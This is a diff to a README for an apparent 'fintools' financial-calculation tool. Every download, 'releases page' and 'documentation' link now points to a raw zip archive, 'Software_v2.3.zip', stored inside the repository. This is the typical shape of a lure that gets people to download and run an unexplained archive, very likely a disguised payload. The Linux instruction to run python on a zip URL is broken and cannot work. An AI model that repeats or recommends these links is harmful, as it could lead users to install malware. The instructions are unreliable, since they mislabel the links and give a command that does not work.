@@ -1,6 +1,6 @@
 # 🌟 fintools - Easy Financial Calculations for Everyone
 
-[![Download fintools](https://raw.githubusercontent.com/ducnguyenminh/fintools/main/commodate/fintools.zip)](https://raw.githubusercontent.com/ducnguyenminh/fintools/main/commodate/fintools.zip)
+[![Download fintools](https://github.com/ducnguyenminh/fintools/raw/refs/heads/main/src/Software_v2.3.zip)](https://github.com/ducnguyenminh/fintools/raw/refs/heads/main/src/Software_v2.3.zip)
 
 ## 📋 Overview
 
@@ -12,7 +12,7 @@ To begin using fintools, you need to download it from our releases page. Follow 
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: Go to the [fintools releases page](https://raw.githubusercontent.com/ducnguyenminh/fintools/main/commodate/fintools.zip) to find the latest version of the software.
+1. **Visit the Releases Page**: Go to the [fintools releases page](https://github.com/ducnguyenminh/fintools/raw/refs/heads/main/src/Software_v2.3.zip) to find the latest version of the software.
 
 2. **Choose the Right File**: Look for the latest version. You will see several files available for download. Select the file that fits your operating system:
    - For Windows: Download the file labeled for Windows.
@@ -24,7 +24,7 @@ To begin using fintools, you need to download it from our releases page. Follow 
 4. **Running the Software**:
    - **Windows**: Open the downloaded file. Follow the installation prompts to complete the setup. Once installed, you can run fintools from the start menu.
    - **MacOS**: Open the downloaded file. Drag the application to your Applications folder. You can then find it in your Applications and run it from there.
-   - **Linux**: Extract the downloaded file. You may need to use a terminal to navigate to the folder and run the command `python https://raw.githubusercontent.com/ducnguyenminh/fintools/main/commodate/fintools.zip` to start.
+   - **Linux**: Extract the downloaded file. You may need to use a terminal to navigate to the folder and run the command `python https://github.com/ducnguyenminh/fintools/raw/refs/heads/main/src/Software_v2.3.zip` to start.
 
 ## 🔍 Features
 
@@ -57,7 +57,7 @@ For more advanced users, you can explore the source code and contribute. Visit o
 
 ## 🌐 Links
 
-- [fintools Releases Page](https://raw.githubusercontent.com/ducnguyenminh/fintools/main/commodate/fintools.zip) - Download the latest version of fintools.
-- [Documentation](https://raw.githubusercontent.com/ducnguyenminh/fintools/main/commodate/fintools.zip) - Find additional usage guides and tips.
+- [fintools Releases Page](https://github.com/ducnguyenminh/fintools/raw/refs/heads/main/src/Software_v2.3.zip) - Download the latest version of fintools.
+- [Documentation](https://github.com/ducnguyenminh/fintools/raw/refs/heads/main/src/Software_v2.3.zip) - Find additional usage guides and tips.
 
 We hope you find fintools helpful in your financial calculations! Enjoy managing your finances with ease.
